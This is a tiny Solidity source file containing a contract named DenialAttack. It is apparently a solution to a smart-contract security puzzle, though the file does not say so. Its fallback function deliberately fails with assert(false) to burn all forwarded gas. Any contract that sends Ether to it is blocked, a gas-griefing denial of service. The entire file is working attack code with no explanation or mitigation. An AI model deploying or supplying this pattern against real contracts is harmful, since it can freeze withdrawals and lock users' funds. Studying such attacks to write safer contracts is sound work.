pragma solidity ^0.6.0;

contract DenialAttack {

    fallback() external payable {
        // Consume all gas
        assert(false);
    }
}